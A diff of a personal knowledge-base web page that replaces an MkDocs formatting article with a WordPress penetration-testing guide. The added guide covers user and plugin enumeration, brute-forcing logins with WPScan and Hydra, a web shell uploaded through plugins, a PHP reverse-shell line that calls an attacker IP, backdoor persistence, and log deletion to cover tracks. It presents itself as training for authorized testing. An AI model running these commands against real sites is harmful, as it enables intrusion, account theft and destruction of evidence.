@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../wpexplo/">
+        <link rel="prev" href="../ssh/">
       
       
-        <link rel="next" href="../venv/">
+        <link rel="next" href="../mkdocs-formatting-guide/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>Formatting Guide - My Knowledge Base</title>
+        <title>Wordpress exploitation - My Knowledge Base</title>
       
     
     
@@ -70,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#mkdocs-formatting-guide" class="md-skip">
+        <a href="#wordpress-exploitation-guide" class="md-skip">
           Skip to content
         </a>
       
@@ -106,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Formatting Guide
+              Wordpress exploitation
             
           </span>
         </div>
@@ -595,65 +595,6 @@
       
   
   
-  
-  
-    <li class="md-nav__item">
-      <a href="../wpexplo/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Wordpress exploitation
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-    
-      
-      
-  
-  
-    
-  
-  
-  
-    
-    
-    
-    
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" checked>
-        
-          
-          <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    MkDocs
-    
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="true">
-          <label class="md-nav__title" for="__nav_21">
-            <span class="md-nav__icon md-icon"></span>
-            MkDocs
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
     
   
   
@@ -670,7 +611,7 @@
           
   
   <span class="md-ellipsis">
-    Formatting Guide
+    Wordpress exploitation
     
   </span>
   
@@ -682,7 +623,7 @@
         
   
   <span class="md-ellipsis">
-    Formatting Guide
+    Wordpress exploitation
     
   </span>
   
@@ -705,37 +646,28 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#basic-document-structure" class="md-nav__link">
+  <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      Basic Document Structure
+      Introduction
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#lists-bullet-points" class="md-nav__link">
+  <a href="#installing-wpscan" class="md-nav__link">
     <span class="md-ellipsis">
-      Lists &amp; Bullet Points
+      Installing WPScan
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Lists & Bullet Points">
+    <nav class="md-nav" aria-label="Installing WPScan">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#unordered-list" class="md-nav__link">
+  <a href="#install-wpscan-on-linux" class="md-nav__link">
     <span class="md-ellipsis">
-      Unordered List:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ordered-list" class="md-nav__link">
-    <span class="md-ellipsis">
-      Ordered List:
+      Install WPScan on Linux
     </span>
   </a>
   
@@ -747,28 +679,55 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#links-images" class="md-nav__link">
+  <a href="#enumerating-wordpress-information" class="md-nav__link">
     <span class="md-ellipsis">
-      Links &amp; Images
+      Enumerating WordPress Information
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Links & Images">
+    <nav class="md-nav" aria-label="Enumerating WordPress Information">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#adding-links" class="md-nav__link">
+  <a href="#detect-wordpress-version" class="md-nav__link">
     <span class="md-ellipsis">
-      Adding Links:
+      Detect WordPress Version
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#adding-images" class="md-nav__link">
+  <a href="#enumerate-wordpress-users" class="md-nav__link">
     <span class="md-ellipsis">
-      Adding Images:
+      Enumerate WordPress Users
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-installed-plugins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerate Installed Plugins
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-themes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerate Themes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#full-enumeration-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Full Enumeration Scan
     </span>
   </a>
   
@@ -780,46 +739,28 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#blockquotes-callouts" class="md-nav__link">
+  <a href="#brute-forcing-wordpress-logins" class="md-nav__link">
     <span class="md-ellipsis">
-      Blockquotes &amp; Callouts
+      Brute-Forcing WordPress Logins
     </span>
   </a>
   
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tables" class="md-nav__link">
-    <span class="md-ellipsis">
-      Tables
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#customizing-mkdocs" class="md-nav__link">
-    <span class="md-ellipsis">
-      Customizing MkDocs
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Customizing MkDocs">
+    <nav class="md-nav" aria-label="Brute-Forcing WordPress Logins">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#configuring-mkdocsyml" class="md-nav__link">
+  <a href="#using-wpscan-for-brute-force" class="md-nav__link">
     <span class="md-ellipsis">
-      Configuring mkdocs.yml
+      Using WPScan for Brute-Force
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#running-the-local-server" class="md-nav__link">
+  <a href="#using-hydra-for-brute-force" class="md-nav__link">
     <span class="md-ellipsis">
-      Running the Local Server
+      Using Hydra for Brute-Force
     </span>
   </a>
   
@@ -831,19 +772,103 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#extending-mkdocs" class="md-nav__link">
+  <a href="#exploiting-vulnerabilities" class="md-nav__link">
     <span class="md-ellipsis">
-      Extending MkDocs
+      Exploiting Vulnerabilities
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Extending MkDocs">
+    <nav class="md-nav" aria-label="Exploiting Vulnerabilities">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#installing-plugins" class="md-nav__link">
+  <a href="#checking-for-known-vulnerabilities" class="md-nav__link">
     <span class="md-ellipsis">
-      Installing Plugins
+      Checking for Known Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#searching-exploit-db-for-wordpress-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Searching Exploit-DB for WordPress Exploits
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manually-checking-for-exposed-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manually Checking for Exposed Files
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uploading-a-malicious-plugin-or-theme" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Malicious Plugin or Theme
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Uploading a Malicious Plugin or Theme">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#uploading-a-web-shell-as-a-plugin" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Web Shell as a Plugin
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#modifying-an-existing-theme" class="md-nav__link">
+    <span class="md-ellipsis">
+      Modifying an Existing Theme
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation Steps
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post-Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#maintaining-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Maintaining Access
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#covering-tracks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Covering Tracks
     </span>
   </a>
   
@@ -867,6 +892,63 @@
   
 </nav>
       
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
+        
+          
+          <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    MkDocs
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_21">
+            <span class="md-nav__icon md-icon"></span>
+            MkDocs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mkdocs-formatting-guide/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Formatting Guide
+    
+  </span>
+  
+
+      </a>
     </li>
   
 
@@ -972,37 +1054,28 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#basic-document-structure" class="md-nav__link">
+  <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      Basic Document Structure
+      Introduction
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#lists-bullet-points" class="md-nav__link">
+  <a href="#installing-wpscan" class="md-nav__link">
     <span class="md-ellipsis">
-      Lists &amp; Bullet Points
+      Installing WPScan
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Lists & Bullet Points">
+    <nav class="md-nav" aria-label="Installing WPScan">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#unordered-list" class="md-nav__link">
+  <a href="#install-wpscan-on-linux" class="md-nav__link">
     <span class="md-ellipsis">
-      Unordered List:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ordered-list" class="md-nav__link">
-    <span class="md-ellipsis">
-      Ordered List:
+      Install WPScan on Linux
     </span>
   </a>
   
@@ -1014,28 +1087,55 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#links-images" class="md-nav__link">
+  <a href="#enumerating-wordpress-information" class="md-nav__link">
     <span class="md-ellipsis">
-      Links &amp; Images
+      Enumerating WordPress Information
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Links & Images">
+    <nav class="md-nav" aria-label="Enumerating WordPress Information">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#adding-links" class="md-nav__link">
+  <a href="#detect-wordpress-version" class="md-nav__link">
     <span class="md-ellipsis">
-      Adding Links:
+      Detect WordPress Version
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#adding-images" class="md-nav__link">
+  <a href="#enumerate-wordpress-users" class="md-nav__link">
     <span class="md-ellipsis">
-      Adding Images:
+      Enumerate WordPress Users
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-installed-plugins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerate Installed Plugins
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-themes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerate Themes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#full-enumeration-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Full Enumeration Scan
     </span>
   </a>
   
@@ -1047,46 +1147,28 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#blockquotes-callouts" class="md-nav__link">
+  <a href="#brute-forcing-wordpress-logins" class="md-nav__link">
     <span class="md-ellipsis">
-      Blockquotes &amp; Callouts
+      Brute-Forcing WordPress Logins
     </span>
   </a>
   
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tables" class="md-nav__link">
-    <span class="md-ellipsis">
-      Tables
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#customizing-mkdocs" class="md-nav__link">
-    <span class="md-ellipsis">
-      Customizing MkDocs
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Customizing MkDocs">
+    <nav class="md-nav" aria-label="Brute-Forcing WordPress Logins">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#configuring-mkdocsyml" class="md-nav__link">
+  <a href="#using-wpscan-for-brute-force" class="md-nav__link">
     <span class="md-ellipsis">
-      Configuring mkdocs.yml
+      Using WPScan for Brute-Force
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#running-the-local-server" class="md-nav__link">
+  <a href="#using-hydra-for-brute-force" class="md-nav__link">
     <span class="md-ellipsis">
-      Running the Local Server
+      Using Hydra for Brute-Force
     </span>
   </a>
   
@@ -1098,19 +1180,103 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#extending-mkdocs" class="md-nav__link">
+  <a href="#exploiting-vulnerabilities" class="md-nav__link">
     <span class="md-ellipsis">
-      Extending MkDocs
+      Exploiting Vulnerabilities
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Extending MkDocs">
+    <nav class="md-nav" aria-label="Exploiting Vulnerabilities">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#installing-plugins" class="md-nav__link">
+  <a href="#checking-for-known-vulnerabilities" class="md-nav__link">
     <span class="md-ellipsis">
-      Installing Plugins
+      Checking for Known Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#searching-exploit-db-for-wordpress-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Searching Exploit-DB for WordPress Exploits
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manually-checking-for-exposed-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manually Checking for Exposed Files
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uploading-a-malicious-plugin-or-theme" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Malicious Plugin or Theme
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Uploading a Malicious Plugin or Theme">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#uploading-a-web-shell-as-a-plugin" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Web Shell as a Plugin
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#modifying-an-existing-theme" class="md-nav__link">
+    <span class="md-ellipsis">
+      Modifying an Existing Theme
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation Steps
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post-Exploitation Steps">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#maintaining-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Maintaining Access
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#covering-tracks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Covering Tracks
     </span>
   </a>
   
@@ -1146,137 +1312,131 @@
 
 
 
+<h1 id="wordpress-exploitation-guide">WordPress Exploitation Guide</h1>
+<h2 id="introduction">Introduction</h2>
+<p>WordPress is one of the most widely used CMS platforms, making it a common target for security testing. This guide covers <strong>enumeration, vulnerability scanning, and exploitation techniques</strong> using <strong>WPScan</strong> and other tools.</p>
+<p><strong>Warning:</strong> This guide is for educational and authorized security testing only. Unauthorized access is illegal.</p>
 <hr />
-<h1 id="mkdocs-formatting-guide">MkDocs Formatting Guide</h1>
-<p>MkDocs is a static site generator for project documentation that uses Markdown. This guide covers the essential formatting and structuring tips for writing articles in MkDocs.</p>
-<hr />
-<h2 id="basic-document-structure">Basic Document Structure</h2>
-<p>MkDocs follows a simple hierarchy using <strong>Markdown headings</strong>:</p>
-<pre><code class="language-markdown"># Main Title (h1)
-## Subheading (h2)
-### Section (h3)
-#### Subsection (h4)
+<h2 id="installing-wpscan">Installing WPScan</h2>
+<p>WPScan is a WordPress security scanner used for <strong>enumerating users, plugins, themes, and vulnerabilities</strong>.</p>
+<h3 id="install-wpscan-on-linux">Install WPScan on Linux</h3>
+<pre><code class="language-bash">sudo apt update &amp;&amp; sudo apt install wpscan -y
 </code></pre>
-<p><strong>Example:</strong></p>
-<pre><code class="language-markdown"># My MkDocs Knowledge Base
-
-## Networking Commands
-
-### Scanning Open Ports with Nmap
-```bash
-nmap -sV -A &lt;target&gt;
+<p>Or install using Ruby:</p>
+<pre><code class="language-bash">gem install wpscan
 </code></pre>
-<pre><code>
----
-
-## Code Blocks
-
-For adding code snippets, use **triple backticks** (` ``` `) with the language specified:
-
-```markdown
-```bash
-ls -lah
-</code></pre>
-<pre><code>
-This renders as:
-
-```bash
-ls -lah
-</code></pre>
-<p>Alternatively, you can use <strong>four-space indentation</strong>, but backticks are preferred for syntax highlighting:</p>
-<pre><code class="language-markdown">    ls -lah
+<p>Verify installation:</p>
+<pre><code class="language-bash">wpscan --help
 </code></pre>
 <hr />
-<h2 id="lists-bullet-points">Lists &amp; Bullet Points</h2>
-<p>MkDocs supports both <strong>unordered</strong> and <strong>ordered</strong> lists:</p>
-<h3 id="unordered-list">Unordered List:</h3>
-<pre><code class="language-markdown">- Item 1
-- Item 2
-  - Subitem 2.1
-  - Subitem 2.2
+<h2 id="enumerating-wordpress-information">Enumerating WordPress Information</h2>
+<h3 id="detect-wordpress-version">Detect WordPress Version</h3>
+<pre><code class="language-bash">wpscan --url http://target.com --rua
 </code></pre>
-<h3 id="ordered-list">Ordered List:</h3>
-<pre><code class="language-markdown">1. First item
-2. Second item
-   1. Sub-item
-   2. Sub-item
+<ul>
+<li><strong><code>--rua</code></strong> → Random user-agent to avoid detection.</li>
+</ul>
+<h3 id="enumerate-wordpress-users">Enumerate WordPress Users</h3>
+<pre><code class="language-bash">wpscan --url http://target.com -e u
 </code></pre>
+<ul>
+<li><strong><code>-e u</code></strong> → Enumerate users (useful for brute-force attacks).</li>
+</ul>
+<h3 id="enumerate-installed-plugins">Enumerate Installed Plugins</h3>
+<pre><code class="language-bash">wpscan --url http://target.com -e p
+</code></pre>
+<ul>
+<li><strong><code>-e p</code></strong> → Enumerate plugins (check for vulnerable versions).</li>
+</ul>
+<h3 id="enumerate-themes">Enumerate Themes</h3>
+<pre><code class="language-bash">wpscan --url http://target.com -e t
+</code></pre>
+<ul>
+<li><strong><code>-e t</code></strong> → Enumerate themes.</li>
+</ul>
+<h3 id="full-enumeration-scan">Full Enumeration Scan</h3>
+<pre><code class="language-bash">wpscan --url http://target.com -e u,p,t --api-token YOUR_API_TOKEN
+</code></pre>
+<ul>
+<li><strong>Using an API token</strong> enables checking against WPScan’s vulnerability database.</li>
+</ul>
 <hr />
-<h2 id="links-images">Links &amp; Images</h2>
-<h3 id="adding-links">Adding Links:</h3>
-<pre><code class="language-markdown">[OpenAI](https://openai.com)
+<h2 id="brute-forcing-wordpress-logins">Brute-Forcing WordPress Logins</h2>
+<h3 id="using-wpscan-for-brute-force">Using WPScan for Brute-Force</h3>
+<pre><code class="language-bash">wpscan --url http://target.com -U users.txt -P passwords.txt --max-threads 10
 </code></pre>
-<p>This renders as: <a href="https://openai.com">OpenAI</a></p>
-<h3 id="adding-images">Adding Images:</h3>
-<pre><code class="language-markdown">![Alt Text](https://example.com/image.png)
+<ul>
+<li><strong><code>-U users.txt</code></strong> → Uses a list of usernames.</li>
+<li><strong><code>-P passwords.txt</code></strong> → Uses a password list.</li>
+<li><strong><code>--max-threads 10</code></strong> → Uses 10 concurrent threads for speed.</li>
+</ul>
+<h3 id="using-hydra-for-brute-force">Using Hydra for Brute-Force</h3>
+<pre><code class="language-bash">hydra -L users.txt -P passwords.txt http-post-form \
+'wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:F=incorrect'
 </code></pre>
-<p>You can also specify image width in MkDocs using custom CSS.</p>
+<ul>
+<li><strong><code>-L users.txt</code></strong> → Username list.</li>
+<li><strong><code>-P passwords.txt</code></strong> → Password list.</li>
+<li><strong>Customizes login request parameters for WordPress.</strong></li>
+</ul>
 <hr />
-<h2 id="blockquotes-callouts">Blockquotes &amp; Callouts</h2>
-<p>Blockquotes are used for emphasizing notes or warnings:</p>
-<pre><code class="language-markdown">&gt; This is a blockquote. Use it for important notes.
+<h2 id="exploiting-vulnerabilities">Exploiting Vulnerabilities</h2>
+<h3 id="checking-for-known-vulnerabilities">Checking for Known Vulnerabilities</h3>
+<p>Use WPScan to check for outdated versions and vulnerabilities:</p>
+<pre><code class="language-bash">wpscan --url http://target.com --api-token YOUR_API_TOKEN
 </code></pre>
-<p>To create <strong>callouts</strong> using extensions like <code>admonition</code>:</p>
-<pre><code class="language-markdown">!!! note &quot;Important Note&quot;
-    This is a highlighted note.
+<ul>
+<li>Checks themes, plugins, and core version against vulnerability database.</li>
+</ul>
+<h3 id="searching-exploit-db-for-wordpress-exploits">Searching Exploit-DB for WordPress Exploits</h3>
+<pre><code class="language-bash">searchsploit wordpress
 </code></pre>
+<ul>
+<li>Returns available exploits for WordPress and its plugins.</li>
+</ul>
+<h3 id="manually-checking-for-exposed-files">Manually Checking for Exposed Files</h3>
+<pre><code class="language-bash">curl -s http://target.com/wp-config.php~
+curl -s http://target.com/.git/
+</code></pre>
+<ul>
+<li>Some sites leave <strong>backup files</strong> and <code>.git</code> folders exposed.</li>
+</ul>
 <hr />
-<h2 id="tables">Tables</h2>
-<p>Tables can be created using <strong>pipes (</strong>``<strong>)</strong>:</p>
-<pre><code class="language-markdown">| Command  | Description       |
-|----------|-----------------|
-| `ls`     | List directory contents |
-| `pwd`    | Print working directory |
+<h2 id="uploading-a-malicious-plugin-or-theme">Uploading a Malicious Plugin or Theme</h2>
+<p>If admin credentials are obtained, a backdoor can be uploaded using a <strong>malicious plugin</strong>.</p>
+<h3 id="uploading-a-web-shell-as-a-plugin">Uploading a Web Shell as a Plugin</h3>
+<ol>
+<li>Create a zip file with a PHP shell inside <code>/wp-content/plugins/</code>.</li>
+<li>Upload it via the WordPress Admin Panel (<code>Appearance &gt; Plugins &gt; Add New</code>).</li>
+<li>Activate the plugin to execute the payload.</li>
+</ol>
+<h3 id="modifying-an-existing-theme">Modifying an Existing Theme</h3>
+<ol>
+<li>Edit <code>functions.php</code> inside an installed theme.</li>
+<li>Add a PHP web shell:</li>
+</ol>
+<pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1'&quot;); ?&gt;
 </code></pre>
-<p>This renders as:</p>
-<table>
-<thead>
-<tr>
-<th>Command</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>ls</code></td>
-<td>List directory contents</td>
-</tr>
-<tr>
-<td><code>pwd</code></td>
-<td>Print working directory</td>
-</tr>
-</tbody>
-</table>
+<ol>
+<li>Access the theme file in a browser to trigger the shell.</li>
+</ol>
 <hr />
-<h2 id="customizing-mkdocs">Customizing MkDocs</h2>
-<h3 id="configuring-mkdocsyml">Configuring <code>mkdocs.yml</code></h3>
-<p>Your `` defines the navigation and settings:</p>
-<pre><code class="language-yaml">site_name: My Documentation
-nav:
-  - Home: index.md
-  - Guide: guide.md
-theme:
-  name: material
-</code></pre>
-<h3 id="running-the-local-server">Running the Local Server</h3>
-<p>Start the MkDocs server locally to preview changes:</p>
-<pre><code class="language-bash">mkdocs serve
-</code></pre>
-<p>Visit <code>http://127.0.0.1:8000/</code> in your browser.</p>
-<hr />
-<h2 id="extending-mkdocs">Extending MkDocs</h2>
-<h3 id="installing-plugins">Installing Plugins</h3>
-<p>You can extend MkDocs with plugins:</p>
-<pre><code class="language-bash">pip install mkdocs-material
-</code></pre>
-<p>Then add it to <code>mkdocs.yml</code>:</p>
-<pre><code class="language-yaml">theme:
-  name: material
-</code></pre>
+<h2 id="post-exploitation-steps">Post-Exploitation Steps</h2>
+<h3 id="maintaining-access">Maintaining Access</h3>
+<ul>
+<li><strong>Create a new admin user</strong> via SQL injection or shell access.</li>
+<li><strong>Modify the wp-config.php</strong> to include persistent backdoors.</li>
+<li><strong>Schedule reverse shells</strong> via cron jobs.</li>
+</ul>
+<h3 id="covering-tracks">Covering Tracks</h3>
+<ul>
+<li>Delete logs: <code>rm -rf /var/log/apache2/*</code></li>
+<li>Clear history: <code>history -c</code></li>
+</ul>
 <hr />
 <h2 id="conclusion">Conclusion</h2>
-<p>This guide covers the essentials for formatting articles in MkDocs, including headings, code blocks, lists, links, images, and tables. Keep your documentation structured, readable, and well-organized!</p>
-<hr />
+<p>WordPress security testing involves <strong>enumeration, brute-force attacks, vulnerability exploitation, and post-exploitation persistence</strong>. Proper defenses include <strong>hardened login credentials, disabling unused plugins, and updating regularly</strong>.</p>
+<p>Test ethically and secure your WordPress sites properly.</p>
 
 
 
